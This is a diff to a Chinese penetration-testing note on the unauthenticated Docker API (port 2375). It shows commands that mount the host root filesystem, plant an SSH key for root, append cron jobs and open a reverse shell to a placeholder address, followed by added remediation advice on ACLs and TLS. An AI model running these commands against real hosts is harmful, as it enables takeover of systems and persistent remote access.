@@ -28,6 +28,7 @@ sed -i '$a*/2 *    * * *    root  bash /tmp/test.sh ' /test/etc/crontab
 
 ## docker 未授权
 
+访问 http://your-ip:2375/version
 ```sh
 docker -H tcp://47.92.7.138:2375 images
 docker -H tcp://47.92.7.138:2375 ps -a
@@ -35,4 +36,14 @@ docker -H tcp://47.92.7.138:2375 ps -a
 docker -H tcp://47.92.7.138:2375 run -it -v /:/mnt --entrypoint /bin/bash ubuntu:18.04
 cd /mnt/root/.ssh/
 echo "ssh-rsa AAAAB3NzaC1yc2......." > authorized_keys
+
+# 反弹shell -- 可通过 crontab -e 写入定时任务
+* * * * * /bin/sh -i >& /dev/tcp/xxx.xxx.xxx.xxx./1111 0>&1
 ```
+
+
+# 0x04 修复建议
+
+1、对 2375 端口做网络访问控制，如 ACL 控制，或者访问规则；
+
+2、修改 docker swarm 的认证方式，使用 TLS 认证：Overview Swarm with TLS 和 Configure Docker Swarm for TLS 这两篇文档，说的是配置好 TLS 后，Docker CLI 在发送命令到 docker daemon 之前，会首先发送它的证书，如果证书是由 daemon 信任的 CA 所签名的，才可以继续执行。
